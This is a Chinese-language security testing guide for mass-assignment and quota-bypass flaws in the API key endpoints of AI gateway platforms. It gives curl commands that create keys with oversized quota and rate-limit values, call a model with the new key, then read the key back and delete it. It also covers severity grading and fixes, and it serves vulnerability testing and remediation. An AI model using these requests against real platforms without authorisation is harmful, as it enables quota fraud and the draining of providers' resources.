# API Key 管理接口批量赋值/配额绕过测试模式

适用场景：AI 网关、模型代理、会员套餐、API Key 自助创建平台。

## 核心风险

普通用户创建/更新 API Key 时，后端如果复用 Admin DTO/ORM 结构体，可能接受并落库本应由服务端控制的字段：

- `quota`
- `rate_limit_1d`
- `rate_limit_5h`
- `rate_limit_7d`
- `usage_*`
- `status`
- `user_id`
- `expires_at`
- `group_id` / 套餐组字段

其中 `quota`、`rate_limit_*` 最值得优先验证：如果普通用户能设置超大值，并且新 Key 可真实调用模型接口，即可形成“套餐/限流绕过 → 平台资源消耗”的高危业务逻辑漏洞。

## 低影响验证流程

1. 先用普通用户登录，获取 Bearer token。
2. 查询已有 Key，确认接口路径和字段结构：

```bash
curl -sk "https://target/api/v1/keys?page=1&page_size=5" -H "Authorization: Bearer TOKEN"
```

重点看响应是否返回完整 `key` 明文；如果返回完整 `sk-...`，单独构成敏感凭证泄露。

3. 创建临时测试 Key，提交超大 quota / rate_limit：

```bash
curl -sk "https://target/api/v1/keys" -X POST -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"name":"quota-abuse-proof","group_id":3,"quota":999999999999,"rate_limit_1d":999999999999}'
```

成立信号：HTTP 200，响应中 `quota` / `rate_limit_1d` 原样为超大值，并返回新建 Key 明文。

4. 用新建 Key 做一次最小模型调用，证明不是“仅落库无效”：

```bash
curl -sk "https://target/v1/chat/completions" -X POST -H "Authorization: Bearer sk-新建Key" -H "Content-Type: application/json" -d '{"model":"gpt-5.5","messages":[{"role":"user","content":"reply exactly OK"}],"max_tokens":5,"stream":false}'
```

成立信号：HTTP 200，返回 `choices` 和 `usage`。

5. 读回 Key，确认 usage/quota 已更新：

```bash
curl -sk "https://target/api/v1/keys/测试KeyID" -H "Authorization: Bearer TOKEN"
```

6. 必须清理临时 Key：

```bash
curl -sk "https://target/api/v1/keys/测试KeyID" -X DELETE -H "Authorization: Bearer TOKEN"
```

## 定级参考

- 仅返回自己 Key 明文：中危，敏感信息泄露。
- 可创建超大 quota/rate_limit Key，但不能调用：中危或低危，取决于是否影响后续逻辑。
- 可创建超大 quota/rate_limit Key，并可调用模型产生 usage：高危，业务逻辑/权限控制缺失/配额绕过。
- 可设置 `user_id` 为他人或绑定未购买套餐组：高危到严重，视是否能接管/消耗他人额度。

## 修复建议

1. 用户侧创建/更新 API Key 必须使用字段白名单，只允许 `name`、必要的 IP 白/黑名单等用户可控字段。
2. 普通用户提交的 `quota`、`rate_limit_*`、`usage_*`、`status`、`user_id`、`expires_at` 必须忽略。
3. quota/rate_limit 由后端根据订阅、套餐组、管理员策略计算。
4. Admin DTO 与 User DTO 分离，避免复用管理端结构体导致批量赋值。
5. 对已有 Key 做异常扫描：超出套餐上限、负数 quota/rate_limit、异常 group_id。
6. API Key 创建后只展示一次；查询接口返回脱敏 `masked_key`，不要返回完整明文。
